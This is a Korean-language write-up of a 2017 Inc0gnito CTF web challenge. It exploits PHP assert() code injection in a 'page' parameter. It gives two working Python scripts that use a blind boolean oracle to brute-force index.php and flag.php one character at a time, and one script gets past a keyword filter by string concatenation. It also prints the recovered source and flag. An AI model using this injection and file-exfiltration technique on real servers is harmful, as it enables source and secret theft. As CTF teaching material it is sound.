# [2017_Inc0gnito] \[WEB] sophie

### Problem

문제 서버 - http://prob.nagi.moe:9091/

`http://prob.nagi.moe:9091/index.php?page=board`를 보면 알 수 있듯이 page라는 파라미터를 이용하여 페이지를 보여줍니다.

`http://prob.nagi.moe:9091/index.php?page=board'` 끝에 인용부호를 넣으면 에러 메시지가 발생합니다.

```
( ! ) Parse error: syntax error, unexpected '', '' (T_CONSTANT_ENCAPSED_STRING) in /var/www/html/index.php(33) : assert code on line 1
Call Stack
#	Time	Memory	Function	Location
1	0.0000	223640	{main}( )	../index.php:0
2	0.0001	225200	assert ( )	../index.php:33

( ! ) Catchable fatal error: assert(): Failure evaluating code: strpos('./includes/board'.php', 'php://') === false in /var/www/html/index.php on line 33
Call Stack
#	Time	Memory	Function	Location
1	0.0000	223640	{main}( )	../index.php:0
2	0.0001	225200	assert ( )	../index.php:33
```

보아하니 assert를 쓰는 듯합니다. assert를 이용하여 LFI 공격을 하면 될 듯합니다.



### Solution

```python
import requests
import string
import base64
import urllib

target = "index.php"
url = "http://prob.nagi.moe:9091/index.php"
content=""
i = 1
while True:
	for j in range(len(string.printable)):
		tmpContent = content + string.printable[j]
		tmpContent = base64.encodestring(tmpContent)
		param = {"page":"', 'qwer') === false && substr(file_get_contents('{}'),0,{}) == base64_decode('{}'); //".format(target,i,tmpContent)}
		r = requests.get(url, params = param)
		if "No php wrapper!" not in r.text:
                        i += 1
                        content += string.printable[j]
                        break
	if j == len(string.printable)-1:
                print "*** Complete ***"
                break
	print content
f=open(target, "w")
f.write(content)
f.close
```

브포로 index.php의 소스코드를 한글자씩 긁어왔습니다.

```php
<!DOCTYPE html>
<html>
	<head>
		<title>Hello to my website!</title>
		<meta charset="utf-8">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
		<link rel="stylesheet" href="style.css">
		<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
	</head>
<?php
	//FLAG is at ./includes/flag.php
	include_once("header.php");
	if(isset($_GET['page'])){
		$page = $_GET['page'];
	}
	else{
		$page = "home";
	}
	if(strpos($page, "..")){
		$page = "home";
	}
	if(strpos($page, "flag")){
		$page = "home";
	}
	$file = "./includes/" . $page. ".php";
	error_reporting(E_ALL);
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	assert_options(ASSERT_ACTIVE, true);
	assert_options(ASSERT_WARNING, true);
	assert("strpos('$file', 'php://') === false") or die("No php wrapper!");
	@require_once($file);
?>
</html>
```

`./includes/flag.php`에 flag가 있고고 php wrapper는 사용 불가합니다. 또, flag라는 문자열이 들어가면 필터링 됩니다.



```python
import requests
import string
import base64
import urllib

url = "http://prob.nagi.moe:9091/index.php"
content=""
i = 1
while True:
	for j in range(len(string.printable)):
		tmpContent = content + string.printable[j]
		tmpContent = base64.encodestring(tmpContent)
		param = {"page":"', 'qwer') === false && substr(file_get_contents('includes/f'.'lag.php'),0,{}) == base64_decode('{}'); //".format(i,tmpContent)}
		r = requests.get(url, params = param)
		if "No php wrapper!" not in r.text:
                        i += 1
                        content += string.printable[j]
                        break
	if j == len(string.printable)-1:
                print "*** Complete ***"
                break
	print content
f=open('flag.php', "w")
f.write(content)
f.close
```

php의 concatenate를 이용하여 flag 문자열이 필터링되는 것을 우회한 후, 한글자씩 브포를 통해 코드를 긁어왔습니다.

```php
<?php
	$FLAG = "INC0{assert_is_for_klee_right?}";
?>
```

